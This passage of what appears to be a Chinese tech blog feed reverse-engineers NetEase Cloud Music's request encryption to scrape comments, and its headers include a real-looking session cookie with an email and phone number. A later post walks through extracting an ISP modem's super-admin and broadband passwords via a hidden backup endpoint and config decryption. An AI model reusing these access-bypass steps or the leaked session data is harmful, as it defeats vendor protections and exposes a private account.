class="number">1</span> &amp; b) &amp;&amp; (c = <span class="title function_">biMultiply</span>(c, d)),</span><br><span class="line">            b &gt;&gt;= <span class="number">1</span>,</span><br><span class="line">        <span class="number">0</span> == b)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d = <span class="title function_">biMultiply</span>(d, d)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">biPowMod</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> d = bigOne, e = a, f = b; ;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != (<span class="number">1</span> &amp; f.<span class="property">digits</span>[<span class="number">0</span>]) &amp;&amp; (d = <span class="title function_">biMultiplyMod</span>(d, e, c)),</span><br><span class="line">            f = <span class="title function_">biShiftRight</span>(f, <span class="number">1</span>),</span><br><span class="line">        <span class="number">0</span> == f.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">biHighIndex</span>(f))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        e = <span class="title function_">biMultiplyMod</span>(e, e, c)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> d</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BarrettMu</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">modulus</span> = <span class="title function_">biCopy</span>(a),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">k</span> = <span class="title function_">biHighIndex</span>(<span class="variable language_">this</span>.<span class="property">modulus</span>) + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">var</span> b = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    b.<span class="property">digits</span>[<span class="number">2</span> * <span class="variable language_">this</span>.<span class="property">k</span>] = <span class="number">1</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">mu</span> = <span class="title function_">biDivide</span>(b, <span class="variable language_">this</span>.<span class="property">modulus</span>),</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">bkplus1</span> = <span class="keyword">new</span> <span class="title class_">BigInt</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">bkplus1</span>.<span class="property">digits</span>[<span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>] = <span class="number">1</span>,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">modulo</span> = <span class="title class_">BarrettMu</span>_modulo,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">multiplyMod</span> = <span class="title class_">BarrettMu</span>_multiplyMod,</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">powMod</span> = <span class="title class_">BarrettMu</span>_powMod</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BarrettMu_modulo</span>(<span class="params">a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> i, b = <span class="title function_">biDivideByRadixPower</span>(a, <span class="variable language_">this</span>.<span class="property">k</span> - <span class="number">1</span>), c = <span class="title function_">biMultiply</span>(b, <span class="variable language_">this</span>.<span class="property">mu</span>), d = <span class="title function_">biDivideByRadixPower</span>(c, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>),</span><br><span class="line">        e = <span class="title function_">biModuloByRadixPower</span>(a, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>), f = <span class="title function_">biMultiply</span>(d, <span class="variable language_">this</span>.<span class="property">modulus</span>),</span><br><span class="line">        g = <span class="title function_">biModuloByRadixPower</span>(f, <span class="variable language_">this</span>.<span class="property">k</span> + <span class="number">1</span>), h = <span class="title function_">biSubtract</span>(e, g);</span><br><span class="line">    <span class="keyword">for</span> (h.<span class="property">isNeg</span> &amp;&amp; (h = <span class="title function_">biAdd</span>(h, <span class="variable language_">this</span>.<span class="property">bkplus1</span>)),</span><br><span class="line">             i = <span class="title function_">biCompare</span>(h, <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>; i;)</span><br><span class="line">        h = <span class="title function_">biSubtract</span>(h, <span class="variable language_">this</span>.<span class="property">modulus</span>),</span><br><span class="line">            i = <span class="title function_">biCompare</span>(h, <span class="variable language_">this</span>.<span class="property">modulus</span>) &gt;= <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BarrettMu_multiplyMod</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> c = <span class="title function_">biMultiply</span>(a, b);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">modulo</span>(c)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">BarrettMu_powMod</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> d, e, c = <span class="keyword">new</span> <span class="title class_">BigInt</span>;</span><br><span class="line">    <span class="keyword">for</span> (c.<span class="property">digits</span>[<span class="number">0</span>] = <span class="number">1</span>,</span><br><span class="line">             d = a,</span><br><span class="line">             e = b; ;) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != (<span class="number">1</span> &amp; e.<span class="property">digits</span>[<span class="number">0</span>]) &amp;&amp; (c = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(c, d)),</span><br><span class="line">            e = <span class="title function_">biShiftRight</span>(e, <span class="number">1</span>),</span><br><span class="line">        <span class="number">0</span> == e.<span class="property">digits</span>[<span class="number">0</span>] &amp;&amp; <span class="number">0</span> == <span class="title function_">biHighIndex</span>(e))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        d = <span class="variable language_">this</span>.<span class="title function_">multiplyMod</span>(d, d)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> maxDigits, <span class="variable constant_">ZERO_ARRAY</span>, bigZero, bigOne, dpl10, lr10, hexatrigesimalToChar, hexToChar, highBitMasks, lowBitMasks,</span><br><span class="line">    biRadixBase = <span class="number">2</span>, biRadixBits = <span class="number">16</span>, bitsPerDigit = biRadixBits, biRadix = <span class="number">65536</span>, biHalfRadix = biRadix &gt;&gt;&gt; <span class="number">1</span>,</span><br><span class="line">    biRadixSquared = biRadix * biRadix, maxDigitVal = biRadix - <span class="number">1</span>, maxInteger = <span class="number">9999999999999998</span>;</span><br><span class="line"><span class="title function_">setMaxDigits</span>(<span class="number">20</span>),</span><br><span class="line">    dpl10 = <span class="number">15</span>,</span><br><span class="line">    lr10 = <span class="title function_">biFromNumber</span>(<span class="number">1e15</span>),</span><br><span class="line">    hexatrigesimalToChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>, <span class="string">&quot;g&quot;</span>, <span class="string">&quot;h&quot;</span>, <span class="string">&quot;i&quot;</span>, <span class="string">&quot;j&quot;</span>, <span class="string">&quot;k&quot;</span>, <span class="string">&quot;l&quot;</span>, <span class="string">&quot;m&quot;</span>, <span class="string">&quot;n&quot;</span>, <span class="string">&quot;o&quot;</span>, <span class="string">&quot;p&quot;</span>, <span class="string">&quot;q&quot;</span>, <span class="string">&quot;r&quot;</span>, <span class="string">&quot;s&quot;</span>, <span class="string">&quot;t&quot;</span>, <span class="string">&quot;u&quot;</span>, <span class="string">&quot;v&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="string">&quot;x&quot;</span>, <span class="string">&quot;y&quot;</span>, <span class="string">&quot;z&quot;</span>),</span><br><span class="line">    hexToChar = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&quot;0&quot;</span>, <span class="string">&quot;1&quot;</span>, <span class="string">&quot;2&quot;</span>, <span class="string">&quot;3&quot;</span>, <span class="string">&quot;4&quot;</span>, <span class="string">&quot;5&quot;</span>, <span class="string">&quot;6&quot;</span>, <span class="string">&quot;7&quot;</span>, <span class="string">&quot;8&quot;</span>, <span class="string">&quot;9&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>, <span class="string">&quot;e&quot;</span>, <span class="string">&quot;f&quot;</span>),</span><br><span class="line">    highBitMasks = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">32768</span>, <span class="number">49152</span>, <span class="number">57344</span>, <span class="number">61440</span>, <span class="number">63488</span>, <span class="number">64512</span>, <span class="number">65024</span>, <span class="number">65280</span>, <span class="number">65408</span>, <span class="number">65472</span>, <span class="number">65504</span>, <span class="number">65520</span>, <span class="number">65528</span>, <span class="number">65532</span>, <span class="number">65534</span>, <span class="number">65535</span>),</span><br><span class="line">    lowBitMasks = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">15</span>, <span class="number">31</span>, <span class="number">63</span>, <span class="number">127</span>, <span class="number">255</span>, <span class="number">511</span>, <span class="number">1023</span>, <span class="number">2047</span>, <span class="number">4095</span>, <span class="number">8191</span>, <span class="number">16383</span>, <span class="number">32767</span>, <span class="number">65535</span>);</span><br><span class="line">!<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">a</span>(<span class="params">a</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d, e, b = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;</span>, c = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (d = <span class="number">0</span>; a &gt; d; d += <span class="number">1</span>)</span><br><span class="line">            e = <span class="title class_">Math</span>.<span class="title function_">random</span>() * b.<span class="property">length</span>,</span><br><span class="line">                e = <span class="title class_">Math</span>.<span class="title function_">floor</span>(e),</span><br><span class="line">                c += b.<span class="title function_">charAt</span>(e);</span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">b</span>(<span class="params">a, b</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> c = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(b)</span><br><span class="line">            , d = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(<span class="string">&quot;0102030405060708&quot;</span>)</span><br><span class="line">            , e = <span class="title class_">CryptoJS</span>.<span class="property">enc</span>.<span class="property">Utf8</span>.<span class="title function_">parse</span>(a)</span><br><span class="line">            , f = <span class="title class_">CryptoJS</span>.<span class="property">AES</span>.<span class="title function_">encrypt</span>(e, c, &#123;</span><br><span class="line">            <span class="attr">iv</span>: d,</span><br><span class="line">            <span class="attr">mode</span>: <span class="title class_">CryptoJS</span>.<span class="property">mode</span>.<span class="property">CBC</span></span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> f.<span class="title function_">toString</span>()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">c</span>(<span class="params">a, b, c</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> d, e;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">setMaxDigits</span>(<span class="number">131</span>),</span><br><span class="line">            d = <span class="keyword">new</span> <span class="title class_">RSAKeyPair</span>(b, <span class="string">&quot;&quot;</span>, c),</span><br><span class="line">            e = <span class="title function_">encryptedString</span>(d, a)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">d</span>(<span class="params">d, e, f, g</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> h = &#123;&#125;</span><br><span class="line">            , i = <span class="title function_">a</span>(<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">return</span> h.<span class="property">encText</span> = <span class="title function_">b</span>(d, g),</span><br><span class="line">            h.<span class="property">encText</span> = <span class="title function_">b</span>(h.<span class="property">encText</span>, i),</span><br><span class="line">            h.<span class="property">encSecKey</span> = <span class="title function_">c</span>(i, e, f),</span><br><span class="line">            h</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">e</span>(<span class="params">a, b, d, e</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> f = &#123;&#125;;</span><br><span class="line">        <span class="keyword">return</span> f.<span class="property">encText</span> = <span class="title function_">c</span>(a + e, b, d),</span><br><span class="line">            f</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">window</span>.<span class="property">asrsea</span> = d,</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">ecnonasr</span> = e</span><br><span class="line">&#125;();</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">test</span>(<span class="params">i8a</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> md = <span class="string">&#x27;00e0b509f6259df8642dbc35662901477df22677ec152b5ff68ace615bb7b725152b3ab17a876aea8a5aa76d2e417629ec4ee341f56135fccf695280104e0312ecbda92557c93870114af6c9d05c4f7f0c3685b7a46bee255932575cce10b424d813cfe4875d3e82047b97ddef52741d546b8e289dc6935b3ece0462db0a22b8e7&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">asrsea</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(i8a), <span class="string">&#x27;010001&#x27;</span>, md, <span class="string">&#x27;0CoJUm6Qyw8W8jud&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://img.xpctf.cn/img/202110260344545.png"><br>python获取评论代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> execjs</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;authority&#x27;</span>: <span class="string">&#x27;music.163.com&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;pragma&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cache-control&#x27;</span>: <span class="string">&#x27;no-cache&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua&#x27;</span>: <span class="string">&#x27;&quot;Google Chrome&quot;;v=&quot;95&quot;, &quot;Chromium&quot;;v=&quot;95&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;content-type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;nm-gcore-status&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-mobile&#x27;</span>: <span class="string">&#x27;?0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-ch-ua-platform&#x27;</span>: <span class="string">&#x27;&quot;Windows&quot;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept&#x27;</span>: <span class="string">&#x27;*/*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;origin&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-site&#x27;</span>: <span class="string">&#x27;same-origin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-mode&#x27;</span>: <span class="string">&#x27;cors&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;sec-fetch-dest&#x27;</span>: <span class="string">&#x27;empty&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;referer&#x27;</span>: <span class="string">&#x27;https://music.163.com/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;_ntes_nnid=a432b2ae1906c58d65e1b6a163e27edb,1619322454607; _ntes_nuid=a432b2ae1906c58d65e1b6a163e27edb; P_INFO=m15037364078@163.com|1620975917|0|mail163|00&amp;99|CN&amp;1620975345&amp;mail163#yun&amp;530300#10#0#0|150078&amp;1|mail163|15037364078@163.com; nts_mail_user=15037364078@163.com:-1:1; _iuqxldmzr_=32; NMTID=00Oz3EtWJ2a8rRgMED-jAFMgMvS1zoAAAF5abGv-A; WEVNSM=1.0.0; WM_TID=wbyXeKF8aptBRUQEQUZ71zjW2lOOR4Zo; WNMCID=iohmhp.1625021556317.01.0; _ga=GA1.1.785647165.1620109727; Qs_lvt_382223=1627131623; Qs_pv_382223=4345274553004783600; _ga_C6TGHFPQ1H=GS1.1.1627131623.1.0.1627131628.0; WM_NIKE=9ca17ae2e6ffcda170e2e6eeb0ce4fa79bb7d6db3db4a88fa6d55e978f8aabb67ca1aa9e99cb62a192fc8cae2af0fea7c3b92ab0aaadb8f343f59f9eafb85da8af84b2d4218cabfca3ee5fa19afbb3b760b8989e92f34890998f89fb5d8891b9b4cb45bb86a2aff23aa7b9f892f64b98e88392b147f79cbb96c559ae9c9eb8c62595b188d3b65a939ec0a2f16698aac0a9bb62ed9bfa8bf840b1f581a2b24af2949ab2ea39bc9b998ad33b92ece594f642ac969a8ddc37e2a3; WM_NI=lvcWpI7ARN5WdqLQQ%2BHu4BoUcF5R4TtHRqpLLGAhxWDOwSHOyZnNs2eg8qwAT8Mq2M5DuuFSnDRWG%2FWoH27RQBpArnTvpH8j%2FE6ju4s%2BOA3B2LVQk3xEWiP1R4%2BswJhJVlY%3D; JSESSIONID-WYYY=WEPhA74tSdjtGi5MBPMNiD6KoMBI9DNM4rvQDKWXQTh1eT0MR3EPa7vO1fxxp04HF9F%2F3u6q%2Fsgw8ZrFhaPwBcYODTFSfGQYRyB9AaEl9%2BgRH%2B5PCtq0wG0duemw%2BmE2%5Cr%5C%2B8fwu3T%5CKp9Q%5CV2uat9%2B1i3d56y8zuKq0BPVABTo%5CFvGz%3A1635188406751&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;params&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;encSecKey&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;2.js&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    ctx = execjs.<span class="built_in">compile</span>(fp.read())</span><br><span class="line"><span class="keyword">for</span> page <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">45</span>):</span><br><span class="line">    i8a = &#123;</span><br><span class="line">        <span class="string">&quot;rid&quot;</span>: <span class="string">&quot;R_SO_4_1851695540&quot;</span>,</span><br><span class="line">        <span class="string">&quot;threadId&quot;</span>: <span class="string">&quot;R_SO_4_1851695540&quot;</span>,</span><br><span class="line">        <span class="string">&quot;pageNo&quot;</span>: <span class="built_in">str</span>(page),</span><br><span class="line">        <span class="string">&quot;pageSize&quot;</span>: <span class="string">&quot;20&quot;</span>,</span><br><span class="line">        <span class="string">&quot;cursor&quot;</span>: <span class="string">&quot;1630028942804&quot;</span>,</span><br><span class="line">        <span class="string">&quot;offset&quot;</span>: <span class="string">&quot;40&quot;</span>,</span><br><span class="line">        <span class="string">&quot;orderType&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">        <span class="string">&quot;csrf_token&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    d = ctx.call(<span class="string">&#x27;test&#x27;</span>, i8a)</span><br><span class="line">    data[<span class="string">&#x27;params&#x27;</span>] = d[<span class="string">&#x27;encText&#x27;</span>]</span><br><span class="line">    data[<span class="string">&#x27;encSecKey&#x27;</span>] = d[<span class="string">&#x27;encSecKey&#x27;</span>]</span><br><span class="line">    res = requests.post(<span class="string">&#x27;https://music.163.com/weapi/comment/resource/comments/get?csrf_token=&#x27;</span>, headers=headers,</span><br><span class="line">                        data=data)</span><br><span class="line"></span><br><span class="line">    comments = res.json()[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;comments&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> comment <span class="keyword">in</span> comments:</span><br><span class="line">        <span class="built_in">print</span>(&#123;<span class="string">&#x27;作者&#x27;</span>: comment[<span class="string">&#x27;user&#x27;</span>][<span class="string">&#x27;nickname&#x27;</span>], <span class="string">&#x27;内容&#x27;</span>: comment[<span class="string">&#x27;content&#x27;</span>]&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Node.Js运行AES RSA加密缺少window的解决方法</title>
      <link href="/posts/c34f/"/>
      <url>/posts/c34f/</url>
      
        <content type="html"><![CDATA[<p>Js逆向中，会遇到很多环境问题，比如navigator、document、window这些只有浏览器才有的，然后代码扣下来浏览器可以运行，在一些调试工具也可以运行，但是nodejs就是运行不了。</p><p><img src="https://img.xpctf.cn/img/202109151737709.png"></p><p>问过很多大佬， 他们说缺什么补什么，document和navigator就给一个空对象，window就给this，这样很多调试工具都可以用了，但是nodejs就是运行不了，报上面的错误。</p><p>在我不经意中居然解决了该问题，测试过nodejs和execjs都可以执行，就是window使用global变量</p><p><img src="https://img.xpctf.cn/img/202109151804026.png"></p><p>但是在js调试工具中报错：</p><p><img src="https://img.xpctf.cn/img/202109151751061.png"></p><p>总结如下：在调试工具中，window&#x3D;this，在nodejs中，window&#x3D;global。</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> js逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>电信光猫TEWA-708G超级管理密码破解</title>
      <link href="/posts/c480/"/>
      <url>/posts/c480/</url>
      
        <content type="html"><![CDATA[<p>先把U盘插到光猫USB接口，然后登录普通账号，账号密码在光猫后面有写，网址：<a href="http://192.168.1.1:8080/login.html">http://192.168.1.1:8080/login.html</a></p><p><img src="https://img.xpctf.cn/img/202109021510632.png"></p><p>登录成功以后按键盘的F12打开开发者工具，然后输入`<code>http://192.168.1.1:8080/usbbackup.cmd?action=backupeble&amp;sessionKey=$&#123;sessionKey&#125;</code>`</p><p><img src="https://img.xpctf.cn/img/202109021528703.png"></p><p>点击链接打开，不要管我的前后sessionKey不一样</p><p><img src="https://img.xpctf.cn/img/202109021515498.png"></p><p>如果 备份配置 按钮点击不了，把鼠标放在 备份配置 上右键检查</p><p><img src="https://img.xpctf.cn/img/202109021516893.png"></p><p>然后双击 disabled 点删除键就行(回车上面第二个键)，打错字删除那个键，不是delete键</p><p><img src="https://img.xpctf.cn/img/202109021516738.png"></p><p>这时候可以点击 备份配置 了，点了以后直接会跳转到一个空白页面，url是这样的：<a href="http://192.168.1.1:8080/usbbackup.cmd?action=backup&subarea=usb1_1&set1_sessionKey=set1_sessionKey_214">http://192.168.1.1:8080/usbbackup.cmd?action=backup&amp;subarea=usb1_1&amp;set1_sessionKey=set1_sessionKey_214</a></p><p>这时候不要管，直接把U盘拔下来插上电脑，然后u盘里多了一个叫 e8_Config_Backup 的文件夹</p><p><img src="https://img.xpctf.cn/img/202109021522604.png">、</p><p>此时的ctce8_TEWA-708G.cfg是加密文件，我们看不了，使用xor工具破解一下，命令看截图</p><p><img src="https://img.xpctf.cn/img/202109021524872.png"></p><p>xor下载地址：<a href="https://github.com/jonirrings/xor">https://github.com/jonirrings/xor</a></p><p>最后用记事本打开生成的xml文件，搜索password就可以看到密码</p><p><img src="https://img.xpctf.cn/img/202109021525524.png"></p><p>使用telecomadmin和上面获取到的密码登录就可以看到更多设置，可以自己做拨号，关闭光猫拨号</p><p><img src="https://img.xpctf.cn/img/202109022126782.png"></p><p>宽带账号密码：</p><p>搜索2_INTERNET_R_VID_41，下面的Username和Password就是宽带密码</p><p><img src="https://img.xpctf.cn/img/202109021527334.png"></p><p>密码经过了base64编码，使用在线工具就可以解码，百度：base64解码</p><p>下面是Python一键脚本，输出超级管理员密码和宽带账号密码：</p><p>复制脚本保存成py文件，下载xor.exe工具和py文件放在一起，修改好账号密码运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> glob <span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GuanMao</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, api, user, password</span>):</span><br><span class="line">        self.Api = api</span><br><span class="line">        self.UserName = user</span><br><span class="line">        self.PassWord = base64.b64encode(password.encode()).decode()</span><br><span class="line">        self.abc()</span><br><span class="line">        self.session = requests.session()</span><br><span class="line">        self.login()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;登录成功，正在备份配置文件...&#x27;</span>)</span><br><span class="line">        self.usbbackup()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">abc</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_bak = glob(<span class="string">&#x27;*.cfg&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;配置文件也存在<span 